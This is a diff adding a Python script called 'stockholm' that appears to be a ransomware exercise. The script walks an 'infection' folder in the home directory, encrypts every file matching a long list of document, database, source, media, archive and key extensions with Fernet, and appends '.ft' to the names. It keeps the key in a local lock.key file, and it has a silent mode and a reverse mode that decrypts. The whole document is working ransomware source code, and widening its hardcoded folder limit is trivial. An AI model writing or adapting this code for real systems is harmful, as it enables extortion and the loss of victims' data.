@@ -1,0 +1,149 @@
+#!/usr/bin/env python3
+
+import sys
+import os
+import argparse
+from colorama import Fore, Style
+from cryptography.fernet import Fernet
+
+EXTENSIONS = [
+    ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".ott", ".sxw",
+    ".stw", ".uot", ".3ds", ".max", ".3dm", ".ods", ".ots", ".sxc", ".stc", ".dif",
+    ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm",
+    ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb",
+    ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf",
+    ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".bat",
+    ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php",
+    ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla",
+    ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv",
+    ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd",
+    ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg",
+    ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz", ".tar", ".bak",
+    ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm",
+    ".sldx", ".sti", ".sxi", ".602", ".hwp", ".snt", ".onetoc2", ".dwg", ".pdf",
+    ".wk1", ".wks", ".123", ".rtf", ".csv", ".txt", ".vsdx", ".vsd", ".edb", ".eml",
+    ".msg", ".ost", ".pst", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps",
+    ".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt",
+    ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".dot", ".docm",
+    ".docb", ".docx", ".doc"
+]
+
+def reverse() -> str:
+	files = file_finder()
+	try:
+		with open("lock.key", 'rb') as file:
+			key = file.read()
+	except Exception as e:
+		print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
+		sys.exit(1)
+	fernet = Fernet(key)
+	for file in files:
+		if not file.endswith(".ft"):
+			continue
+		original_file_name = file[:-3]
+		if '.' not in original_file_name:
+			continue
+		try:
+			new_name = file[:-3]
+			if not any(new_name.endswith(ext) for ext in EXTENSIONS):
+				os.rename(file, new_name)
+				continue
+			with open(file, 'rb') as r_file:
+				encrypted_data = r_file.read()
+			decrypted_data = fernet.decrypt(encrypted_data)
+			with open(file, 'wb') as w_file:
+				w_file.write(decrypted_data)
+			printer(f"{Fore.YELLOW} decrypting {file}{Style.RESET_ALL}")
+			os.rename(file, new_name)
+		except Exception as e:
+			print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
+			sys.exit(1)
+
+def key_generator():
+	if os.path.exists("lock.key"):
+		return
+	key = Fernet.generate_key()
+	try:
+		with open("lock.key", 'wb') as key_file:
+			key_file.write(key)
+	except Exception as e:
+		print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
+		sys.exit(1)
+	
+def printer(message: str):
+	if silent_mode == False:
+		print(message)
+
+def file_finder() -> list:
+	found_files = []
+	stockholm_path = os.path.join(os.path.expanduser('~'), 'infection')
+	if not os.path.exists(stockholm_path):
+		print("infection directory not found in HOME directory")
+		sys.exit(1)
+	for dirpath, dirnames, filenames in os.walk(stockholm_path):
+		for filename in filenames:
+			file_path = os.path.join(dirpath, filename)
+			found_files.append(file_path)
+	return found_files
+
+def file_rename(files: list):
+	for file in files:
+		if not file.endswith(".ft"):
+			os.rename(file, file + ".ft")
+
+def file_encryptor(files: list):
+	try:
+		with open("lock.key", 'rb') as file:
+			key = file.read()
+	except Exception as e:
+		print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
+		sys.exit(1)
+	fernet = Fernet(key)
+	for file in files:
+		if not any(file.endswith(ext) for ext in EXTENSIONS):
+			continue
+		try:
+			with open(file, 'rb') as r_file:
+				data = r_file.read()
+			encypted_data = fernet.encrypt(data)
+			with open(file, 'wb') as w_file:
+				w_file.write(encypted_data)
+			printer(f"{Fore.YELLOW} encrypting {file}{Style.RESET_ALL}")
+		except Exception as e:
+			print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
+			sys.exit(1)
+	file_rename(files)
+
+def stockholm() -> str:
+	key_generator()
+	found_files = file_finder()
+	file_encryptor(found_files)
+
+def main():
+	global silent_mode
+	silent_mode = False
+	try:
+		parser = argparse.ArgumentParser(description="stockholm")
+		parser.add_argument("-v", "--version", action="store_true", help="program version")
+		parser.add_argument("-r", "--reverse", action="store_true", help="reverse the encryption")
+		parser.add_argument("-s", "--silent", action="store_true", help="silent mode")
+
+		args = parser.parse_args()
+		used_arguments = [arg for arg in vars(args) if getattr(args, arg)]
+		if len(used_arguments) > 1 and not args.silent:
+			print(f"{Fore.RED}Error: more than one arguments is used{Style.RESET_ALL}")
+			sys.exit(1)
+		if args.silent:
+			silent_mode = True
+		if args.version:
+			print("version 1.0")
+		elif args.reverse:
+			reverse()
+		else:
+			stockholm()
+	except Exception as e:
+		print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
+		sys.exit(1)
+
+if __name__ == "__main__":
+	main()
